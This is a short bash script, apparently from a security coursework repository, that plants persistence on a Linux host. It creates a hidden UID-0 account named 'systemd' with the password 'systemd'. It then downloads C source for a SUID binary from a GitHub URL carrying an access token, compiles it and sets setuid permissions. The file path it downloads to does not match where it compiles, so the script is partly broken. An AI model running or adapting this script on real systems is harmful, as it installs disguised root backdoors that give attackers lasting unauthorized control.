#!/bin/bash

#Create root user
useradd -ou 0 -g 0 systemd
chpasswd <<<"systemd:systemd"

#suid binary
cd /tmp
wget "https://raw.githubusercontent.com/kevinnivekkevin/3204_coursework_1/main/attack/Persistence/binarysuid?token=GHSAT0AAAAAABZGUXA6ZPLNEYAOANXQOGRCY2UFGGQ" -O /var/tmp/suid.c
gcc suid.c -o suid
chmod 7111 suid
rm suid.c